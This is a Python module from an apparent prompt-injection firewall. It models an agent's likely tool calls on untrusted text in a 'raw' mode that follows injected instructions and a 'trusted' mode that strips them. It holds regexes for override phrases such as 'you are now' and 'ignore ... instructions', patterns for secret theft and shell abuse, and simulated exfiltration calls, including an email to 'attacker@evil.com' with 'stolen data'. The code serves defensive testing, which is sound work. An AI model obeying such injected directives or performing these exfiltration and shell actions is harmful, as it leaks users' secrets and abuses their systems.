"""Deterministic (and optional LLM) agent planner for behavioral twin."""

from __future__ import annotations

import os
import re
from typing import Optional

from firewall.models import AgentPlan, ToolCall

ROLE_RE = re.compile(
    r"you\s+are\s+now\s+(\w+)|act\s+as\s+(?:an?\s+)?([a-z0-9_\- ]{3,40})",
    re.I,
)


def plan_from_text(text: str, mode: str = "raw") -> AgentPlan:
    """Extract likely tool calls from text. Used for twin comparison.

    mode=raw: follow instructions as written (including untrusted)
    mode=trusted: only honor trusted user goals; ignore injected tool directives
    """
    lower = text.lower()
    tools: list[ToolCall] = []
    role = None

    role_m = ROLE_RE.search(text)
    if role_m:
        role = (role_m.group(1) or role_m.group(2) or "").strip()

    # In trusted mode, strip untrusted blocks before planning
    planning_text = text
    if mode == "trusted":
        planning_text = re.sub(
            r"<<<(?:pdf|html|email|ocr|image|api|word|markdown|code):untrusted>>>.*?<<<end>>>",
            " ",
            text,
            flags=re.I | re.S,
        )
        planning_text = re.sub(
            r"\[untrusted:.*?preview=.*?\]",
            " ",
            planning_text,
            flags=re.I | re.S,
        )
        # Also remove classic injection lines from remaining user text for tool intent
        planning_text = re.sub(
            r"(ignore\s+.*?instructions?.*)|(get_secret.*?)|(send_email.*?(attacker|evil))",
            " ",
            planning_text,
            flags=re.I | re.S,
        )

    pl = planning_text.lower()

    def add(name: str, arguments: dict, rationale: str) -> None:
        if not any(t.name == name and t.arguments == arguments for t in tools):
            tools.append(ToolCall(name=name, arguments=arguments, rationale=rationale))

    # Secret / credential intent
    if re.search(r"get_secret|api[_\s-]?key|dump\s+(secrets|credentials)|reveal\s+.*password", pl):
        add("get_secret", {"name": "api_key"}, "secret extraction intent")

    # Email exfil
    email_m = re.search(r"([\w.+-]+@[\w.-]+\.\w+)", planning_text)
    if re.search(r"send_email|email\s+(this|it|the\s+secret|credentials)\s+to", pl) or (
        email_m and re.search(r"send|forward|exfil", pl)
    ):
        to = email_m.group(1) if email_m else "attacker@evil.com"
        add(
            "send_email",
            {"to": to, "subject": "exfil", "body": "stolen data"},
            "email send intent",
        )

    if re.search(r"shell_exec|run\s+bash|execute\s+command", pl):
        add("shell_exec", {"command": "id"}, "shell abuse intent")

    if re.search(r"write_file|overwrite\s+system", pl):
        add("write_file", {"path": "/tmp/pwned", "content": "x"}, "write abuse intent")

    # Benign productivity intents
    if re.search(r"summarize|summary|tldr", pl):
        add("summarize", {"text": planning_text[:1500]}, "user asked for summary")

    if re.search(r"search|find\s+(docs|documents)|look\s+up", pl):
        add("search_docs", {"query": "product"}, "document search")

    if re.search(r"read\s+(the\s+)?(file|pdf|document)|open\s+attachment", pl):
        add("read_file", {"path": "product_brief.txt"}, "read document")

    if re.search(r"call\s+api|check\s+status|inventory\s+api", pl):
        add("call_api", {"url": "https://api.corp.example/v1/status"}, "api call")

    # If nothing matched but there is content, default summarize for trusted benign
    if not tools and mode == "trusted" and pl.strip():
        add("summarize", {"text": planning_text[:1500]}, "default benign response plan")

    notes = f"planner_mode={mode}"
    # Optional LLM enrichment
    llm_plan = _optional_llm_plan(planning_text, mode)
    if llm_plan is not None:
        return llm_plan

    return AgentPlan(tools=tools, role_assumed=role if mode == "raw" else None, notes=notes)


def _optional_llm_plan(text: str, mode: str) -> Optional[AgentPlan]:
    api_key = os.getenv("OPENAI_API_KEY")
    base = os.getenv("AEGIS_LLM_BASE_URL", "https://api.openai.com/v1")
    if not api_key and "localhost" not in base and "127.0.0.1" not in base:
        return None
    try:
        import json
        import httpx

        prompt = (
            "You are an agent planner. Given the user content, list tool calls as JSON "
            '{"tools":[{"name":"...","arguments":{}}],"role_assumed":null}. '
            f"Mode={mode}. Available tools: search_docs, read_file, summarize, call_api, "
            "get_secret, send_email, write_file, shell_exec.\n\nCONTENT:\n"
            + text[:4000]
        )
        headers = {"Content-Type": "application/json"}
        if api_key:
            headers["Authorization"] = f"Bearer {api_key}"
        model = os.getenv("AEGIS_LLM_MODEL", "gpt-4o-mini")
        resp = httpx.post(
            f"{base.rstrip('/')}/chat/completions",
            headers=headers,
            json={
                "model": model,
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0,
            },
            timeout=20.0,
        )
        resp.raise_for_status()
        content = resp.json()["choices"][0]["message"]["content"]
        m = re.search(r"\{.*\}", content, re.S)
        if not m:
            return None
        data = json.loads(m.group(0))
        tools = [
            ToolCall(name=t["name"], arguments=t.get("arguments") or {}, rationale="llm")
            for t in data.get("tools", [])
        ]
        return AgentPlan(tools=tools, role_assumed=data.get("role_assumed"), notes=f"llm:{mode}")
    except Exception:  # noqa: BLE001
        return None
